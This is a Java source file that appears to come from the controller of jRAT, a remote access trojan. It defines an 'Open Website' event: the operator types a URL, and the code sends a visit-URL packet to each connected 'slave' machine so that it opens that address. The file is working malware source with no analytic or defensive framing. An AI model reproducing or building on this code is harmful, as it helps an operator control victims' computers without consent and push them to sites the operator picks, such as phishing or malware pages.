package io.jrat.controller.events;

import iconlib.IconUtils;
import io.jrat.controller.AbstractSlave;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet14VisitURL;
import io.jrat.controller.utils.NetUtils;
import io.jrat.controller.utils.Utils;

import javax.swing.ImageIcon;


public class OpenWebsiteEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String url;

	public OpenWebsiteEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url };
	}

	@Override
	public void perform(AbstractSlave sl) {
		if (sl instanceof Slave) {
			((Slave)sl).addToSendQueue(new Packet14VisitURL(url));
		}
	}

	@Override
	public String toString() {
		return "Open Website";
	}

	@Override
	public boolean add() {
		String result = Utils.showDialog("Visit URL", "Input URL to visit");

		if (result != null && !NetUtils.isURL(result)) {
			result = "http://" + result;
		}

		if (result == null) {
			return false;
		}

		url = result.trim();

		return true;
	}

	@Override
	public String getIcon() {
		return "url";
	}

}